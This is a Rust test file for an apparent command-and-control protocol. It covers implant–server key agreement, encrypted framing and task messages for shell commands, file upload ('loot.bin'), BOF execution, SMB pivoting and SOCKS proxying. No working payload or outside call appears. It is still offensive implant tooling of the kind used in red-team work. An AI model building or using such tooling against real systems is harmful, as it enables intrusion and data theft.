//! Round-trip tests for the protocol: key agreement, framing, message codec.

use nyx_protocol::{crypto, frame, msg, wire};

fn sample_info() -> msg::SessionInfo {
    msg::SessionInfo {
        beacon_id: 7,
        hostname: "ws7".into(),
        username: "CORP\\admin".into(),
        os: "Windows 11 24H2".into(),
        arch: 0,
        pid: 4812,
        is_admin: 1,
    }
}

#[test]
fn ecdh_key_agreement_is_mutual() {
    let server = crypto::ServerKeypair::generate();
    let implant = crypto::ImplantKeypair::generate();

    let k_server = server.derive_for(&implant.public_bytes());
    let k_implant = implant.session_key(&server.public_bytes());

    assert_eq!(k_server, k_implant, "server and implant must derive the same key");
}

#[test]
fn keys_differ_per_session() {
    let server = crypto::ServerKeypair::generate();
    let a = crypto::ImplantKeypair::generate();
    let b = crypto::ImplantKeypair::generate();
    assert_ne!(
        a.session_key(&server.public_bytes()),
        b.session_key(&server.public_bytes()),
        "each session must get a distinct key"
    );
}

#[test]
fn frame_seal_open_roundtrip() {
    let server = crypto::ServerKeypair::generate();
    let implant = crypto::ImplantKeypair::generate();
    let key = implant.session_key(&server.public_bytes());

    let mut w = wire::Writer::new();
    sample_info().encode(&mut w);
    let plaintext = w.into_bytes();

    let frame = frame::encode_frame(&implant.public_bytes(), 0, &key, &plaintext);
    let raw = frame::parse_frame(&frame).unwrap();
    assert_eq!(raw.counter, 0);
    assert_eq!(raw.pubkey, implant.public_bytes());

    let pt = frame::open_frame(&key, &raw).unwrap();
    assert_eq!(pt, plaintext);

    let mut r = wire::Reader::new(&pt);
    let decoded = msg::SessionInfo::decode(&mut r).unwrap();
    assert_eq!(decoded, sample_info());
}

#[test]
fn wrong_key_does_not_decrypt() {
    let server = crypto::ServerKeypair::generate();
    let implant = crypto::ImplantKeypair::generate();
    let key = implant.session_key(&server.public_bytes());

    let frame = frame::encode_frame(&implant.public_bytes(), 0, &key, b"secret");
    let raw = frame::parse_frame(&frame).unwrap();

    let other = crypto::ImplantKeypair::generate();
    let wrong_key = other.session_key(&server.public_bytes());
    assert!(frame::open_frame(&wrong_key, &raw).is_err());
}

#[test]
fn task_batch_roundtrip() {
    let tasks = vec![
        msg::Task { task_id: 1, command: msg::Command::Ping },
        msg::Task {
            task_id: 2,
            command: msg::Command::Shell { args: "whoami /groups".into() },
        },
        msg::Task {
            task_id: 3,
            command: msg::Command::Sleep { seconds: 30, jitter_pct: 20 },
        },
        msg::Task {
            task_id: 4,
            command: msg::Command::Upload { name: "loot.bin".into(), data: vec![0xDE, 0xAD, 0xBE, 0xEF] },
        },
        msg::Task { task_id: 5, command: msg::Command::Exit },
    ];
    let enc = msg::Task::encode_vec(&tasks);
    let dec = msg::Task::decode_vec(&enc).unwrap();
    assert_eq!(dec, tasks);
}

#[test]
fn response_batch_roundtrip() {
    let responses = vec![
        msg::TaskResponse {
            task_id: 2,
            response: msg::Response::Output(b"corp\\admin\n".to_vec()),
        },
        msg::TaskResponse { task_id: 1, response: msg::Response::Ok },
        msg::TaskResponse {
            task_id: 9,
            response: msg::Response::FileChunk {
                name: "doc.pdf".into(),
                seq: 0,
                eof: 1,
                data: vec![1, 2, 3],
            },
        },
    ];
    let enc = msg::TaskResponse::encode_vec(&responses);
    let dec = msg::TaskResponse::decode_vec(&enc).unwrap();
    assert_eq!(dec, responses);
}

#[test]
fn empty_batches_roundtrip() {
    assert!(msg::Task::decode_vec(&msg::Task::encode_vec(&[])).unwrap().is_empty());
    assert!(
        msg::TaskResponse::decode_vec(&msg::TaskResponse::encode_vec(&[]))
            .unwrap()
            .is_empty()
    );
}

#[test]
fn truncated_frame_is_rejected() {
    assert!(frame::parse_frame(&[0u8; 4]).is_err());
}

#[test]
fn p2p_command_variants_roundtrip() {
    let tasks = vec![
        msg::Task {
            task_id: 1,
            command: msg::Command::Ping,
        },
        msg::Task {
            task_id: 2,
            command: msg::Command::Bof {
                name: "whoami.x64.o".into(),
                args: vec!["-v".into()],
                blob: vec![0xCC; 4],
            },
        },
        msg::Task {
            task_id: 3,
            command: msg::Command::Connect {
                proto: 0,
                host: "10.0.0.5".into(),
                port: 445,
                chan: 7,
            },
        },
        msg::Task {
            task_id: 4,
            command: msg::Command::Socks {
                chan: 1,
                op: 1,
                addr: "example.com".into(),
                port: 443,
            },
        },
    ];
    let enc = msg::Task::encode_vec(&tasks);
    let dec = msg::Task::decode_vec(&enc).unwrap();
    assert_eq!(dec, tasks);
}

#[test]
fn channel_response_variants_roundtrip() {
    let responses = vec![
        msg::TaskResponse {
            task_id: 2,
            response: msg::Response::BofOutput(vec![1, 2, 3]),
        },
        msg::TaskResponse {
            task_id: 3,
            response: msg::Response::Channel {
                chan: 7,
                status: 1,
                data: vec![0xAB],
            },
        },
    ];
    let enc = msg::TaskResponse::encode_vec(&responses);
    let dec = msg::TaskResponse::decode_vec(&enc).unwrap();
    assert_eq!(dec, responses);
}
